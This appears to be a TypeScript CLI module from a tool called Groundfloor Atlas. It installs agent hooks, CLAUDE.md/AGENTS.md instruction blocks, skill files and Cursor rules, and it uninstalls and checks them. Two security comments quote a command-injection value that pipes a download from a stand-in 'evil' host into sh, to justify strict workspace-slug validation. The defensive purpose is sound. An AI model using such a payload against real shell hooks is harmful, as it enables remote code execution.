/**
 * cli/wire.ts — `atlas wire`: install the auto-consultation harness into a
 * project so coding agents (Claude Code, Cursor, …) are AUTOMATICALLY consulted
 * through Atlas instead of only being able to call it.
 *
 * This is the piece that turns Atlas from "a set of MCP tools that are available"
 * into "a context layer that is unavoidable". Three artifacts, all idempotent:
 *
 *   1. .claude/settings.json — PreToolUse (Grep/Glob → search-enrich; Edit/Write
 *      → blast-radius + schema-guard), PostToolUse (Bash git commit → stale-
 *      index nudge) and Stop (WO-4: session-end transcript tail → verbatim
 *      memory) hooks. Each shells the tiny scripts/atlas-hook.mjs client.
 *   2. CLAUDE.md + AGENTS.md — a marker-delimited "consult Atlas first"
 *      standing-instruction block (regenerated in place; user prose outside
 *      the markers is preserved). AGENTS.md is the file ZCode/Codex and other
 *      non-Claude agents read.
 *   3. .claude/skills/atlas-* — Onboard / Impact-Analysis / Explore /
 *      Schema-Change skills.
 *
 * All writes MERGE with existing content and are reversible via `atlas wire
 * uninstall` (removes only Atlas-owned entries).
 */

import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { repoSlug } from './repoId.js';
import { checkpointWorkspace } from './checkpoint.js';
import { resolveRepoRoot as atlasRepoRoot } from './service.js';
import { codexMcpEntryPresent } from './ideConnect.js';
import { isGitRepo, installGitHookSync, uninstallGitHookSync, gitHookSyncStatus } from './gitHooks.js';

const CLAUDE_BEGIN = '<!-- atlas-wire-begin -->';
const CLAUDE_END = '<!-- atlas-wire-end -->';
/** Substring that tags an Atlas-owned settings.json hook (for idempotent
 *  install + clean uninstall). Exported — cli/globalWire.ts (Part 3) reuses
 *  it to strip/dedupe Atlas-owned entries in the GLOBAL settings.json the
 *  same way this file does for a per-repo one. */
export const HOOK_TAG = 'atlas-hook.mjs';

/** A workspace name must be a strict slug: lowercase alphanumerics + hyphens,
 *  starting with an alphanumeric. This is the SAME rule workspace_rename enforces
 *  (allTools.ts). It is a HARD security boundary, not just cosmetic: `workspace`
 *  is baked UNQUOTED-SAFE-ONLY into /bin/sh git-hook scripts (gitHooks.ts:
 *  `--workspace "${workspace}"`) written to .git/hooks/{pre-commit,post-merge,
 *  post-checkout} at 0755, and interpolated into CLAUDE.md / skills. A value like
 *  `x";curl http://evil|sh;"` would break out of the shell quoting and execute as
 *  the daemon user on the next commit/pull/checkout — a command-injection → RCE.
 *  We refuse anything that isn't a plain slug rather than trusting shell quoting. */
export const WORKSPACE_SLUG_RE = /^[a-z0-9][a-z0-9-]*$/;

/** Normalize a DERIVED (non-override) workspace candidate — a repoSlug or bare
 *  directory basename, which may carry uppercase, dots, or other chars — into a
 *  string that satisfies WORKSPACE_SLUG_RE. Only applied to values Atlas itself
 *  computes from the filesystem, never to a caller override (that is validated
 *  and rejected, not silently rewritten). Returns '' when nothing usable remains. */
export function slugify(candidate: string): string {
    return candidate
        .toLowerCase()
        .replace(/[^a-z0-9-]+/g, '-')   // unsafe runs → single hyphen
        .replace(/-+/g, '-')             // collapse hyphen runs
        .replace(/^-+|-+$/g, '');        // trim leading/trailing hyphens (→ starts [a-z0-9])
}

interface WireResult {
    ok: boolean;
    [k: string]: unknown;
}

// ── settings.json hooks ──────────────────────────────────────────────────────

interface HookEntry { matcher?: string; hooks: Array<{ type: string; command: string }> }
interface Settings { hooks?: { PreToolUse?: HookEntry[]; PostToolUse?: HookEntry[]; [k: string]: HookEntry[] | undefined }; [k: string]: unknown }

function hookCmd(atlasRoot: string, event: string, workspace: string): string {
    // Pure-node client (builtins only) → any `node` on PATH, ~50ms cold start.
    return `node ${path.join(atlasRoot, 'scripts', 'atlas-hook.mjs')} ${event} ${workspace}`;
}

function readSettings(file: string): Settings {
    try { return JSON.parse(fs.readFileSync(file, 'utf-8')) as Settings; }
    catch { return {}; }
}

/** Drop every Atlas-owned hook entry (matched by command substring) from an
 *  event array, returning the survivors. */
function stripAtlasHooks(entries: HookEntry[] | undefined): HookEntry[] {
    return (entries ?? []).filter((e) => !(e.hooks ?? []).some((h) => h.command?.includes(HOOK_TAG)));
}

function writeSettings(projectDir: string, atlasRoot: string, workspace: string): string {
    const dir = path.join(projectDir, '.claude');
    fs.mkdirSync(dir, { recursive: true });
    const file = path.join(dir, 'settings.json');
    const s = readSettings(file);
    s.hooks = s.hooks ?? {};

    const pre = stripAtlasHooks(s.hooks.PreToolUse);
    pre.push({ matcher: 'Grep|Glob', hooks: [{ type: 'command', command: hookCmd(atlasRoot, 'pre-search', workspace) }] });
    pre.push({ matcher: 'Edit|Write|MultiEdit', hooks: [{ type: 'command', command: hookCmd(atlasRoot, 'pre-edit', workspace) }] });
    s.hooks.PreToolUse = pre;

    const post = stripAtlasHooks(s.hooks.PostToolUse);
    post.push({ matcher: 'Bash', hooks: [{ type: 'command', command: hookCmd(atlasRoot, 'post-bash', workspace) }] });
    s.hooks.PostToolUse = post;

    // WO-4 session-end capture: Stop fires when the agent finishes responding;
    // the hook ships the transcript tail to the daemon's /hooks/verbatim. No
    // matcher — Stop is a lifecycle event, not a tool event. The Settings
    // interface's index signature already admits the new key.
    const stop = stripAtlasHooks(s.hooks.Stop);
    stop.push({ hooks: [{ type: 'command', command: hookCmd(atlasRoot, 'session-end', workspace) }] });
    s.hooks.Stop = stop;

    fs.writeFileSync(file, JSON.stringify(s, null, 2) + '\n');
    return file;
}

function removeSettings(projectDir: string): string | null {
    const file = path.join(projectDir, '.claude', 'settings.json');
    if (!fs.existsSync(file)) return null;
    const s = readSettings(file);
    if (!s.hooks) return file;
    s.hooks.PreToolUse = stripAtlasHooks(s.hooks.PreToolUse);
    s.hooks.PostToolUse = stripAtlasHooks(s.hooks.PostToolUse);
    s.hooks.Stop = stripAtlasHooks(s.hooks.Stop);
    for (const k of ['PreToolUse', 'PostToolUse', 'Stop'] as const) {
        if (s.hooks[k] && s.hooks[k]!.length === 0) delete s.hooks[k];
    }
    if (Object.keys(s.hooks).length === 0) delete s.hooks;
    fs.writeFileSync(file, JSON.stringify(s, null, 2) + '\n');
    return file;
}

// ── CLAUDE.md standing instructions ──────────────────────────────────────────

function claudeBlock(workspace: string): string {
    return [
        CLAUDE_BEGIN,
        '## Groundfloor Atlas — code intelligence + knowledge layer',
        '',
        `This repo is wired to Groundfloor Atlas (workspace \`${workspace}\`). Groundfloor Atlas holds the code graph,`,
        'blast-radius, layer/coupling analysis, and the team knowledge graph. **Consult it —',
        "don't fly blind:**",
        '',
        '- **Before a broad code search**, use `atlas_subgraph` / `knowledge_recall` for a',
        '  structural answer instead of grepping the whole tree.',
        '- **Before changing a function or file**, run `atlas_blast_radius` on the symbol to see',
        '  what will break (d1 = WILL BREAK). The pre-edit hook surfaces this automatically.',
        '- **Before/after a schema change** (`*.sql`, `*.prisma`, `migrations/**`), run',
        '  `atlas_schema_drift` and record the WHY with `schema_confirm` so DB churn stays minimal.',
        '- **When you make a non-obvious decision**, persist it with `knowledge_store` so the next',
        '  engineer (human or agent) recalls it.',
        '- **After a commit**, the index goes stale — run `atlas index .` to refresh.',
        '',
        'Atlas tools are reached through the `atlas` MCP server (`atlas_tool_invoke`).',
        CLAUDE_END,
    ].join('\n');
}

function writeMdBlock(file: string, workspace: string): string {
    const block = claudeBlock(workspace);
    let content = fs.existsSync(file) ? fs.readFileSync(file, 'utf-8') : '';
    const re = new RegExp(`${escapeRe(CLAUDE_BEGIN)}[\\s\\S]*?${escapeRe(CLAUDE_END)}`);
    if (re.test(content)) {
        content = content.replace(re, block);
    } else {
        content = content.trim().length > 0 ? `${content.trimEnd()}\n\n${block}\n` : `${block}\n`;
    }
    fs.writeFileSync(file, content);
    return file;
}

function writeClaudeMd(projectDir: string, workspace: string): string {
    return writeMdBlock(path.join(projectDir, 'CLAUDE.md'), workspace);
}

/** AGENTS.md gets the SAME standing-instructions block as CLAUDE.md — ZCode,
 *  Codex, and other non-Claude agents read AGENTS.md, not CLAUDE.md. */
function writeAgentsMd(projectDir: string, workspace: string): string {
    return writeMdBlock(path.join(projectDir, 'AGENTS.md'), workspace);
}

function removeMdBlock(file: string): string | null {
    if (!fs.existsSync(file)) return null;
    let content = fs.readFileSync(file, 'utf-8');
    const re = new RegExp(`\\n*${escapeRe(CLAUDE_BEGIN)}[\\s\\S]*?${escapeRe(CLAUDE_END)}\\n*`);
    content = content.replace(re, '\n');
    fs.writeFileSync(file, content);
    return file;
}

function removeClaudeMd(projectDir: string): string | null {
    return removeMdBlock(path.join(projectDir, 'CLAUDE.md'));
}

function removeAgentsMd(projectDir: string): string | null {
    return removeMdBlock(path.join(projectDir, 'AGENTS.md'));
}

// ── skills ───────────────────────────────────────────────────────────────────

function skillFiles(workspace: string): Array<{ dir: string; body: string }> {
    return [
        {
            dir: 'atlas-onboard',
            body: skill('atlas-onboard',
                'Onboard a project to Groundfloor Atlas in one flow — workspace + background index + wire harness. Use when asked to "onboard this project to Atlas", "wire this repo with Groundfloor Atlas", "index this repo", or set up Groundfloor Atlas for a project for the first time.',
                [
                    `1. Call \`atlas_onboard\` (path = the repo root). ONE call does everything: derives the workspace from the repo slug and REUSES an existing matching workspace (never duplicates), registers the project path, starts indexing as a BACKGROUND job (returns a jobId immediately), and installs the wire harness (hooks, CLAUDE.md + AGENTS.md standing-instructions blocks, git memory-sync). Do NOT pass wait:true — let it run in the background.`,
                    '2. Tell the user indexing is running in the background and carry on — do NOT block. A large repo can legitimately take tens of minutes; that is expected, not a hang.',
                    `3. Poll \`index_status\` (workspace \`${workspace}\`) every so often until phase is "done" or "error", then report the short summary: files/symbols/edges indexed (filesDone/filesTotal, nodesWritten, edgesWritten), what was installed, and what was SKIPPED — skippedFiles carries the count, the per-reason breakdown, and a sample (e.g. unsupported extension, excluded test fixture). Surface skips explicitly; they are not errors.`,
                    '4. Edge cases — the tool handles them; your job is to SURFACE them, not work around them:',
                    '   - Wrong-path index: if the result carries index.staleIndex, the repo\'s .atlas/index-state.json pointed at a DIFFERENT copy of the repo — a full re-index was forced automatically (resume:false) instead of a broken incremental one. Mention the warning to the user.',
                    '   - AGENTS.md projects: the wire step writes the Atlas standing-instructions block (atlas-wire markers) into AGENTS.md as well as CLAUDE.md, so non-Claude agents (ZCode, Codex) read it too. If the project already had an AGENTS.md, confirm the block landed (wire.agentsFile in the result).',
                    '5. If the daemon predates atlas_onboard (unknown_tool), fall back to the 4-step sequence: workspace_create → workspace_add_project → atlas_index (do not block on it — poll index_status) → atlas_wire.',
                ]),
        },
        {
            dir: 'atlas-impact-analysis',
            body: skill('atlas-impact-analysis',
                'Assess the blast radius of a code change before making it — which callers/processes break. Use before editing or refactoring a function, class, or file.',
                [
                    '1. Identify the symbol(s) you are about to change.',
                    `2. Call \`atlas_blast_radius\` (workspace \`${workspace}\`, direction \`upstream\`) for each — d1 = WILL BREAK, d2 = LIKELY, d3 = TEST.`,
                    '3. For a whole file, use `atlas_subgraph` centered on its `code-file:` node to see dependents.',
                    '4. Report the impacted set to the user and cover d1 callers with tests/edits before committing.',
                ]),
        },
        {
            dir: 'atlas-explore',
            body: skill('atlas-explore',
                'Understand an unfamiliar codebase area via the Atlas graph instead of blind grep. Use when asked "where does X live / how does Y work".',
                [
                    `1. \`atlas_communities\` (workspace \`${workspace}\`) for the architecture map + coupling insights (cycles, hubs).`,
                    '2. `knowledge_recall` / `knowledge_search` for decisions, conventions, and bug patterns about the area.',
                    '3. `atlas_subgraph` centered on the relevant file/community to see structure + dependencies.',
                    '4. Only fall back to grep for literal strings the graph does not model.',
                ]),
        },
        {
            dir: 'atlas-schema-change',
            body: skill('atlas-schema-change',
                'Make a database/schema change safely and keep migration churn minimal. Use when editing *.sql, *.prisma, *.graphql, or migrations.',
                [
                    '1. `atlas_schema_drift` — compare the live-DB dump against declared schema files to see the true delta.',
                    '2. `knowledge_recall` for prior schema decisions so you do not re-litigate or contradict them.',
                    '3. Make the minimal change; prefer additive/back-compatible migrations.',
                    `4. \`schema_confirm\` — record the change title, file, and the WHY into workspace \`${workspace}\` for the next engineer.`,
                ]),
        },
    ];
}

function skill(name: string, description: string, steps: string[]): string {
    return [
        '---',
        `name: ${name}`,
        `description: ${description}`,
        '---',
        '',
        `# ${name}`,
        '',
        ...steps,
        '',
    ].join('\n');
}

function writeSkills(projectDir: string, workspace: string): string[] {
    const base = path.join(projectDir, '.claude', 'skills');
    const written: string[] = [];
    for (const s of skillFiles(workspace)) {
        const dir = path.join(base, s.dir);
        fs.mkdirSync(dir, { recursive: true });
        const file = path.join(dir, 'SKILL.md');
        fs.writeFileSync(file, s.body);
        written.push(file);
    }
    return written;
}

function removeSkills(projectDir: string): string[] {
    const base = path.join(projectDir, '.claude', 'skills');
    const removed: string[] = [];
    for (const s of skillFiles('')) {
        const dir = path.join(base, s.dir);
        if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); removed.push(dir); }
    }
    return removed;
}

// ── Cursor rules ─────────────────────────────────────────────────────────────

/** Verbatim consult-instruction text for Cursor's `.cursor/rules/*.mdc`
 *  mechanism — Cursor's own equivalent of the CLAUDE.md/AGENTS.md standing
 *  instructions block. Fixed content, no per-workspace interpolation (Cursor
 *  rules are static project guidance, not a hook command), so this is a
 *  plain constant rather than a template function like claudeBlock(). Wire
 *  install writes it byte-for-byte; NEVER paraphrase this text. */
export const CURSOR_CONSULT_TEXT = 'Before broad code searches use Atlas (atlas_tool_invoke → knowledge_recall / atlas_subgraph). Before editing a function run atlas_blast_radius on it. After decisions worth keeping, knowledge_store — sparingly, superseding what it replaces.';

function cursorRulesFile(projectDir: string): string {
    return path.join(projectDir, '.cursor', 'rules', 'atlas-consult.mdc');
}

function writeCursorRules(projectDir: string): string {
    const file = cursorRulesFile(projectDir);
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, `${CURSOR_CONSULT_TEXT}\n`);
    return file;
}

function removeCursorRules(projectDir: string): string | null {
    const file = cursorRulesFile(projectDir);
    if (!fs.existsSync(file)) return null;
    fs.rmSync(file);
    return file;
}

// ── public API ────────────────────────────────────────────────────────────────

export interface InstallWireOpts {
    /** W4-T2 — install ONLY the git-based memory sync (export/import hooks +
     *  union merge driver), skipping the IDE consultation harness
     *  (settings.json / CLAUDE.md / skills). The open-source first-run for a
     *  repo that just wants team memory over git. */
    memoryOnly?: boolean;
}

export async function installWire(projectDir: string, workspaceOverride?: string, opts: InstallWireOpts = {}): Promise<WireResult> {
    const abs = path.resolve(projectDir);
    if (!fs.existsSync(abs)) return { ok: false, error: `path does not exist: ${abs}` };
    const memoryOnly = opts.memoryOnly === true;
    // In --memory-only mode the git ledger IS the deliverable, so a non-git dir
    // is a hard, actionable failure rather than the silent skip full-wire allows
    // (full-wire still installs the IDE harness, which is useful pre-`git init`).
    if (memoryOnly && !isGitRepo(abs)) {
        return { ok: false, error: `not a git repo: ${abs} — run \`git init\` first, then \`atlas wire install --memory-only\` (memory sync travels in git).` };
    }
    // A consolidated Atlas workspace may span several repos (e.g. all v3 repos →
    // workspace `v3`), so allow an explicit override; otherwise derive from the
    // repo slug.
    //
    // SECURITY — this is the authoritative choke point. The effective `workspace`
    // flows UNSANITIZED into /bin/sh git-hook scripts written to .git/hooks/* at
    // 0755 (gitHooks.ts `--workspace "${workspace}"`), plus CLAUDE.md + skills. A
    // value like `x";curl http://evil|sh;"` would break out of the shell quoting
    // and execute as the daemon user on the next commit/pull/checkout (RCE). So a
    // caller-SUPPLIED override must be a strict slug or we REJECT it outright — we
    // never trust shell quoting. The DERIVED fallbacks (repoSlug / basename) are
    // normalized to a guaranteed-valid slug instead of rejected, since a directory
    // whose name has uppercase/dots (repoSlug's basename fallback preserves case)
    // is legitimate, not an attack — the danger is exclusively a hostile override.
    const override = workspaceOverride?.trim();
    if (override) {
        if (!WORKSPACE_SLUG_RE.test(override)) {
            return { ok: false, error: `invalid workspace name: ${override} — use lowercase letters, numbers, and hyphens only` };
        }
    }
    // RD-ws-default (extended to wire) — prefer the root's OWN recorded workspace
    // (the .atlas/index-state.json stamp) over the git-remote slug. `atlas index`
    // has always resolved it this way (cli.ts); wire did not, so the two disagreed
    // whenever a repo's data lives in a workspace NOT named after its remote — e.g.
    // several repos consolidated into one workspace (`v3`), or a workspace created
    // before the remote existed. The harness then pointed every hook, skill and
    // CLAUDE.md line at a workspace with zero nodes, and the failure is SILENT:
    // recall returns "nothing found" rather than an error, so the whole
    // auto-consultation layer reads as working while consulting an empty graph.
    // Precedence: explicit override > what the indexer actually used > repo slug.
    const stamped = checkpointWorkspace(abs);
    const derived = (stamped && WORKSPACE_SLUG_RE.test(stamped) ? stamped : null)
        ?? slugify(repoSlug(abs) || path.basename(abs));
    const workspace = override || derived;
    // Belt-and-suspenders: after normalization the derived slug must still be
    // valid; if slugify somehow yields empty (e.g. a dir named only of unsafe
    // chars), refuse rather than write an empty/odd workspace into a shell hook.
    if (!WORKSPACE_SLUG_RE.test(workspace)) {
        return { ok: false, error: `invalid workspace name: ${workspace} — could not derive a valid slug from ${abs}` };
    }
    const atlasRoot = atlasRepoRoot();

    // --memory-only skips the IDE consultation harness (settings.json / CLAUDE.md
    // / skills) and installs ONLY the git-based memory sync below. Full-wire
    // writes all three.
    const settingsFile = memoryOnly ? null : writeSettings(abs, atlasRoot, workspace);
    const claudeFile = memoryOnly ? null : writeClaudeMd(abs, workspace);
    const agentsFile = memoryOnly ? null : writeAgentsMd(abs, workspace);
    const skills = memoryOnly ? [] : writeSkills(abs, workspace);
    const cursorRules = memoryOnly ? null : writeCursorRules(abs);

    // Git-based developer-to-developer knowledge sync (pre-commit export +
    // post-merge/post-checkout import, plus a one-time catch-up import for
    // whatever .atlas/memory.jsonl already arrived with this clone) —
    // best-effort: a project that isn't a git repo yet (or has no .git/hooks
    // for some other reason) still gets the IDE-side wiring above; it just
    // skips the git half rather than failing the whole install.
    const gitSync = isGitRepo(abs) ? await installGitHookSync(abs, workspace) : { ok: false as const, error: 'not a git repo — skipped' };

    const gitHint = gitSync.ok
        ? `Team memory syncs via git now — your commits export \`.atlas/memory.jsonl\` (workspace \`${workspace}\`), teammates get it on pull/clone.`
        : `Git-based memory sync skipped (${gitSync.error}) — run \`atlas wire install --memory-only\` once this is a git repo to enable it.`;

    return {
        ok: true,
        command: 'wire.install',
        mode: memoryOnly ? 'memory-only' : 'full',
        project: abs,
        workspace,
        settingsFile,
        claudeFile,
        agentsFile,
        skills,
        cursorRules,
        gitHookSync: gitSync,
        hint: memoryOnly
            ? gitHint
            : `Wired. Restart the IDE (or reload hooks) so ${path.relative(abs, settingsFile!)} takes effect. Atlas is now consulted before search/edit/commit, and each session's tail is captured to verbatim memory at Stop. ` + gitHint,
    };
}

export function uninstallWire(projectDir: string): WireResult {
    const abs = path.resolve(projectDir);
    const settingsFile = removeSettings(abs);
    const claudeFile = removeClaudeMd(abs);
    const agentsFile = removeAgentsMd(abs);
    const skills = removeSkills(abs);
    const cursorRules = removeCursorRules(abs);
    const gitSync = uninstallGitHookSync(abs);
    return { ok: true, command: 'wire.uninstall', project: abs, settingsFile, claudeFile, agentsFile, skillsRemoved: skills, cursorRules, gitHookSync: gitSync };
}

// ── per-tool wiring status (WO-5) ────────────────────────────────────────────

export type ToolWireStatus = 'wired' | 'partial' | 'not-installed' | 'unknown';

export interface ToolsWireStatus {
    claudeCode: ToolWireStatus;
    omp: ToolWireStatus;
    codex: ToolWireStatus;
    cursor: ToolWireStatus;
    vscode: ToolWireStatus;
}

export interface WireStatusOpts {
    /** Override for the machine home directory (~/.cursor, ~/.omp) a
     *  cross-tool status check reads. Defaults to the real os.homedir() —
     *  tests point this at a scratch tmpdir so a status check never touches
     *  the real machine's Cursor/OMP config. */
    home?: string;
}

function verdictFromParts(parts: boolean[]): ToolWireStatus {
    if (parts.every(Boolean)) return 'wired';
    if (parts.every((p) => !p)) return 'not-installed';
    return 'partial';
}

/** Cursor: two independent artifacts — the machine-level MCP server entry
 *  ideConnect.ts's `atlas connect cursor` writes into ~/.cursor/mcp.json, and
 *  the repo-level `.cursor/rules/atlas-consult.mdc` `wire install` writes
 *  (Cursor's equivalent of the CLAUDE.md/AGENTS.md consult block). A
 *  pre-existing but unparseable mcp.json means we genuinely cannot tell
 *  whether the entry is there — 'unknown', not a guessed 'not-installed'. */
function cursorToolStatus(home: string, projectDir: string): ToolWireStatus {
    const rulesPresent = fs.existsSync(cursorRulesFile(projectDir));
    const mcpFile = path.join(home, '.cursor', 'mcp.json');
    if (!fs.existsSync(mcpFile)) return verdictFromParts([false, rulesPresent]);
    let mcpWired: boolean;
    try {
        const cfg = JSON.parse(fs.readFileSync(mcpFile, 'utf-8')) as Record<string, unknown>;
        const servers = (cfg['mcpServers'] as Record<string, unknown> | undefined) ?? {};
        mcpWired = ['groundfloor-atlas', 'atlas', 'lorebase'].some((k) => k in servers);
    } catch {
        return 'unknown'; // exists but isn't readable JSON — can't verify either way
    }
    return verdictFromParts([mcpWired, rulesPresent]);
}

/** VS Code: ONE artifact, and it's repo-scoped — the `servers.groundfloor-atlas`
 *  entry `atlas connect vscode` writes into <project>/.vscode/mcp.json. That
 *  is VS Code's only officially documented concrete mcp.json path (the
 *  user-profile file is opened via the "MCP: Open User Configuration" command,
 *  not a stable path — every VS Code profile keeps its own). A pre-existing
 *  but unparseable mcp.json means we cannot tell whether the entry is there —
 *  'unknown', not a guessed 'not-installed'. */
function vscodeToolStatus(projectDir: string): ToolWireStatus {
    const mcpFile = path.join(projectDir, '.vscode', 'mcp.json');
    if (!fs.existsSync(mcpFile)) return 'not-installed';
    let mcpWired: boolean;
    try {
        const cfg = JSON.parse(fs.readFileSync(mcpFile, 'utf-8')) as Record<string, unknown>;
        const servers = (cfg['servers'] as Record<string, unknown> | undefined) ?? {};
        mcpWired = ['groundfloor-atlas', 'atlas', 'lorebase'].some((k) => k in servers);
    } catch {
        return 'unknown'; // exists but isn't readable JSON — can't verify either way
    }
    return mcpWired ? 'wired' : 'not-installed';
}

/** Naive line-based scan for whether `needle` is one of the block-style
 *  `extensions:` list items in an OMP config.yml — this repo carries no yaml
 *  dependency and does not need one for a substring membership check. An
 *  inline/flow-style value (`extensions: [a, b]`) is outside what this scan
 *  can resolve, so it reports 'unknown' rather than guessing. */
function ompExtensionRegistered(configYaml: string, needle: string): boolean | 'unknown' {
    const lines = configYaml.split('\n');
    const keyIdx = lines.findIndex((l) => /^extensions:\s*(#.*)?$/.test(l) || /^extensions:\s*\S/.test(l));
    if (keyIdx === -1) return false; // no `extensions:` key at all — definitely not registered
    const trailing = lines[keyIdx]!.replace(/^extensions:/, '').trim();
    if (trailing && !trailing.startsWith('#')) return 'unknown'; // inline/flow-style value
    for (let i = keyIdx + 1; i < lines.length; i++) {
        const item = lines[i]!.match(/^\s+-\s*(.+)$/);
        if (!item) break; // dedented or non-list line ends the block
        if (item[1]!.trim().includes(needle)) return true;
    }
    return false;
}

/** OMP: verified two-part contract — the hook file must exist on disk AND be
 *  registered in ~/.omp/agent/config.yml's `extensions:` list, or it is
 *  completely inert (OMP does not auto-discover hook files in that
 *  directory — an unregistered hook file is silently dead). */
function ompToolStatus(home: string): ToolWireStatus {
    const hookPresent = fs.existsSync(path.join(home, '.omp', 'agent', 'hooks', 'pre', 'atlas-consult.ts'));
    const configFile = path.join(home, '.omp', 'agent', 'config.yml');
    if (!fs.existsSync(configFile)) return verdictFromParts([false, hookPresent]);
    let registered: boolean | 'unknown';
    try {
        registered = ompExtensionRegistered(fs.readFileSync(configFile, 'utf-8'), 'atlas-consult.ts');
    } catch {
        return 'unknown';
    }
    return registered === 'unknown' ? 'unknown' : verdictFromParts([registered, hookPresent]);
}

/** Codex: two independent artifacts — the machine-level MCP server entry
 *  `atlas connect codex` writes into ~/.codex/config.toml, and the repo-level
 *  AGENTS.md consult block `wire install` writes (Codex reads AGENTS.md, not
 *  CLAUDE.md). A pre-existing config.toml the scanner can't safely parse is
 *  'unknown', never a guessed verdict — same contract as cursorToolStatus. */
function codexToolStatus(home: string, projectDir: string): ToolWireStatus {
    let hasAgents: boolean;
    try {
        const agentsFile = path.join(projectDir, 'AGENTS.md');
        hasAgents = fs.existsSync(agentsFile) && fs.readFileSync(agentsFile, 'utf8').includes(CLAUDE_BEGIN);
    } catch {
        return 'unknown';
    }
    const tomlFile = path.join(home, '.codex', 'config.toml');
    if (!fs.existsSync(tomlFile)) return verdictFromParts([false, hasAgents]);
    let mcpWired: boolean | 'unknown';
    try {
        mcpWired = codexMcpEntryPresent(fs.readFileSync(tomlFile, 'utf8'));
    } catch {
        return 'unknown'; // unreadable — can't verify either way
    }
    return mcpWired === 'unknown' ? 'unknown' : verdictFromParts([mcpWired, hasAgents]);
}

export function wireStatus(projectDir: string, opts: WireStatusOpts = {}): WireResult {
    const abs = path.resolve(projectDir);
    const settingsFile = path.join(abs, '.claude', 'settings.json');
    const hasHooks = fs.existsSync(settingsFile) && fs.readFileSync(settingsFile, 'utf-8').includes(HOOK_TAG);
    // WO-4 Stop (session-end capture) hook present? Matched on the exact
    // `atlas-hook.mjs session-end` command so a hypothetical non-Atlas Stop
    // entry is never claimed. readSettings never throws (parse failure → {}).
    const hasStopHook = (readSettings(settingsFile).hooks?.Stop ?? [])
        .some((e) => (e.hooks ?? []).some((h) => h.command?.includes(`${HOOK_TAG} session-end`)));
    const claudeFile = path.join(abs, 'CLAUDE.md');
    const hasClaude = fs.existsSync(claudeFile) && fs.readFileSync(claudeFile, 'utf-8').includes(CLAUDE_BEGIN);
    const agentsFile = path.join(abs, 'AGENTS.md');
    const hasAgents = fs.existsSync(agentsFile) && fs.readFileSync(agentsFile, 'utf-8').includes(CLAUDE_BEGIN);
    const skillsDir = path.join(abs, '.claude', 'skills', 'atlas-impact-analysis');
    const hasSkills = fs.existsSync(skillsDir);
    const gitSyncStatus = gitHookSyncStatus(abs);
    const hasGitSync = Object.values(gitSyncStatus).every((s) => s === 'installed');
    // Mode-aware verdict — a `--memory-only` install deliberately skips the
    // hooks/CLAUDE.md/skills trio, so judging it by "all three present"
    // reported wired:false right after a SUCCESSFUL install. `partial` = some
    // full-wire components present but not all (a half-done or drifted
    // install) — still not 'wired', but now distinguishable.
    // The md-block part counts CLAUDE.md OR AGENTS.md: installs from before
    // AGENTS.md was added are still fully wired, not 'partial'.
    const fullWireParts = [hasHooks, hasClaude || hasAgents, hasSkills];
    const home = opts.home ?? os.homedir();
    const tools: ToolsWireStatus = {
        claudeCode: verdictFromParts(fullWireParts),
        omp: ompToolStatus(home),
        codex: codexToolStatus(home, abs),
        cursor: cursorToolStatus(home, abs),
        vscode: vscodeToolStatus(abs),
    };
    const fullyWired = fullWireParts.every(Boolean);
    const noneFullWire = fullWireParts.every((p) => !p);
    const mode: 'full' | 'memory-only' | 'partial' | 'none' =
        fullyWired ? 'full'
        : (noneFullWire && hasGitSync) ? 'memory-only'
        : (noneFullWire && !hasGitSync) ? 'none'
        : 'partial';
    return {
        ok: true,
        command: 'wire.status',
        project: abs,
        wired: fullyWired || mode === 'memory-only',
        mode,
        hooks: hasHooks,
        stopHook: hasStopHook,
        claudeMd: hasClaude,
        agentsMd: hasAgents,
        skills: hasSkills,
        gitHookSync: gitSyncStatus,
        gitHookSyncWired: hasGitSync,
        tools,
    };
}

function escapeRe(s: string): string {
    return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
